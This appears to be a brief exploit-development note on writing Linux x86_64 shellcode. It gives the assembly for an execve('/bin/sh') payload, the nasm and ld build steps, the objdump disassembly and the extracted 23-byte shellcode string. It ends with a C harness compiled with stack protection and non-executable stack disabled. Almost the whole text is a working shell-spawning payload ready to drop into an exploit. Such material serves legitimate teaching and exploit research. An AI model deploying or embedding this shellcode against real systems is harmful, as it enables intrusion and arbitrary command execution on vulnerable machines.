# &#35; linux x86_64
#### Linux system call table : <https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md/>

```bash
$ cat shell.s
global _start
section .text
_start:
  xor rsi,rsi                   ; xor = 0
  push rsi                      ; push 0x0(null) on stack
  mov rdi,0x68732f2f6e69622f
  push rdi                      ; push /bin/sh + 0x0(null)
  push rsp
  pop rdi                       ; sp direct /bin/sh
  push 59                       ; sys_execve
  pop rax
  cdq
  syscall


$ nasm -felf64 shell.s -o shell.o
$ ld shell.o -o shell
$ ./shell
$ id

$ objdump -M intel -D ./shell

./shell:     file format elf64-x86-64


Disassembly of section .text:

0000000000401000 <_start>:
  401000:	48 31 f6             	xor    rsi,rsi
  401003:	56                   	push   rsi
  401004:	48 bf 2f 62 69 6e 2f 	movabs rdi,0x68732f2f6e69622f
  40100b:	2f 73 68
  40100e:	57                   	push   rdi
  40100f:	54                   	push   rsp
  401010:	5f                   	pop    rdi
  401011:	6a 3b                	push   0x3b
  401013:	58                   	pop    rax
  401014:	99                   	cdq
  401015:	0f 05                	syscall

$ echo "\"$(objdump -d ./shell | grep '[0-9a-f]:' | cut -d$'\t' -f2 | grep -v 'file' | tr -d " \n" | sed 's/../\\x&/g')\""
"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"


$ gcc -fno-stack-protector -z execstack shell.c -o shell

*/

#include <stdio.h>

unsigned char shellcode[] = \
"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05";
int main()
{
    int (*ret)() = (int(*)())shellcode;
    ret();
}

$ gcc -fno-stack-protector -z execstack shell.c -o shell
$ id

```
